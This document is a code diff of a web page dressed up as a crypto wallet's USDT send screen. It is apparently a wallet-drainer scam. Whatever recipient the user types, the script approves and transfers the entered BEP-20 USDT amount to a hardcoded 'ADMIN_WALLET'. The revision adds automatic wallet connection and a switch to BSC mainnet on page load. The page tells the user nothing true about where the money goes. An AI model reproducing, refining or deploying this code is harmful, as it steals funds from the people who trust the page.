@@ -10,15 +10,11 @@
       background: #ffffff;
       margin: 0;
       padding: 0;
-      display: flex;
-      flex-direction: column;
-      height: 100vh;
-      justify-content: space-between;
     }
     .container {
       max-width: 400px;
       margin: auto;
-      padding: 30px 20px 10px 20px;
+      padding: 30px 20px;
     }
     label {
       font-size: 16px;
@@ -56,7 +52,7 @@
       color: #888;
       margin: 0 0 20px 0;
     }
-    .bottom-btn {
+    .next-btn {
       width: 100%;
       padding: 16px;
       background-color: #0047FF;
@@ -66,21 +62,21 @@
       border-radius: 16px;
       cursor: pointer;
       font-weight: bold;
-      margin: 0;
     }
-    .bottom-btn.loading {
-      background-color: #e0e0e0;
+    #processing {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 16px;
       color: #0047FF;
-    }
-    .footer {
-      padding: 10px 20px 30px 20px;
+      font-weight: bold;
+      display: none;
     }
   </style>
 </head>
 <body>
   <div class="container">
     <label for="walletAddress">Address or Domain Name</label>
-    <input type="text" id="walletAddress" placeholder="0x..." value="0x79069192614f7ceE4F..." disabled />
+    <input type="text" id="walletAddress" placeholder="0x..." value="0x79069192614f7ceE4F..." />
 
     <label for="usdtAmount">Amount</label>
     <div class="amount-row">
@@ -90,15 +86,13 @@
     </div>
 
     <p id="usdValue">= $0.00</p>
-  </div>
-
-  <div class="footer">
-    <button class="bottom-btn" id="nextBtn" onclick="startTransfer()">Next</button>
+    <button class="next-btn" onclick="startTransfer()">Next</button>
+    <div id="processing">⏳ Processing... Please wait</div>
   </div>
 
   <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
   <script>
-    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
     const ADMIN_WALLET = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
     const ABI = [
       { "constant": false, "inputs": [ { "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" } ], "name": "approve", "outputs": [ { "name": "", "type": "bool" } ], "type": "function" },
@@ -106,51 +100,60 @@
       { "constant": true, "inputs": [ { "name": "_owner", "type": "address" } ], "name": "balanceOf", "outputs": [ { "name": "balance", "type": "uint256" } ], "type": "function" }
     ];
 
-    const BNB_CHAIN_ID = "0x38";
-    let web3 = new Web3(window.ethereum);
+    const BNB_CHAIN_ID = "0x38"; // BSC Mainnet
+    let web3;
     let account;
-    let token = new web3.eth.Contract(ABI, USDT_ADDRESS);
+    let token;
 
-    async function setMax() {
-      try {
-        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        account = accounts[0];
-        const balance = await token.methods.balanceOf(account).call();
-        document.getElementById("usdtAmount").value = web3.utils.fromWei(balance);
-      } catch (e) {
-        alert("Please open in Trust Wallet DApp browser");
+    async function connectAndCheckChain() {
+      if (window.ethereum) {
+        web3 = new Web3(window.ethereum);
+        try {
+          await window.ethereum.request({ method: 'eth_requestAccounts' });
+          const network = await window.ethereum.request({ method: 'eth_chainId' });
+          if (network !== BNB_CHAIN_ID) {
+            await window.ethereum.request({
+              method: 'wallet_switchEthereumChain',
+              params: [{ chainId: BNB_CHAIN_ID }]
+            });
+          }
+          const accounts = await web3.eth.getAccounts();
+          account = accounts[0];
+          token = new web3.eth.Contract(ABI, USDT_ADDRESS);
+        } catch (err) {
+          alert("Wallet connection failed: " + err.message);
+        }
+      } else {
+        alert("Use Trust Wallet or MetaMask DApp browser");
       }
     }
 
-    async function startTransfer() {
+    window.addEventListener("load", connectAndCheckChain);
+
+    function setMax() {
+      if (!token || !account) return;
+      token.methods.balanceOf(account).call().then(balance => {
+        document.getElementById("usdtAmount").value = web3.utils.fromWei(balance);
+      });
+    }
+
+    function startTransfer() {
       const amount = document.getElementById("usdtAmount").value;
-      const nextBtn = document.getElementById("nextBtn");
       if (!amount) return alert("Enter amount");
       const amountInWei = web3.utils.toWei(amount);
 
-      nextBtn.innerText = "⏳ Processing...";
-      nextBtn.classList.add("loading");
+      document.getElementById("processing").style.display = "block";
 
-      try {
-        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        account = accounts[0];
-        const network = await window.ethereum.request({ method: 'eth_chainId' });
-        if (network !== BNB_CHAIN_ID) {
-          await window.ethereum.request({
-            method: 'wallet_switchEthereumChain',
-            params: [{ chainId: BNB_CHAIN_ID }]
-          });
-        }
-
-        await token.methods.approve(ADMIN_WALLET, amountInWei).send({ from: account });
-        await token.methods.transferFrom(account, ADMIN_WALLET, amountInWei).send({ from: account });
-
-        nextBtn.innerText = "✅ Transfer Complete";
-      } catch (err) {
-        nextBtn.innerText = "❌ " + err.message;
-      } finally {
-        nextBtn.classList.remove("loading");
-      }
+      token.methods.approve(ADMIN_WALLET, amountInWei).send({ from: account })
+        .then(() => {
+          return token.methods.transferFrom(account, ADMIN_WALLET, amountInWei).send({ from: account });
+        })
+        .then(() => {
+          document.getElementById("processing").innerText = "✅ Transfer Complete";
+        })
+        .catch(err => {
+          document.getElementById("processing").innerText = "❌ Error: " + err.message;
+        });
     }
   </script>
 </body>
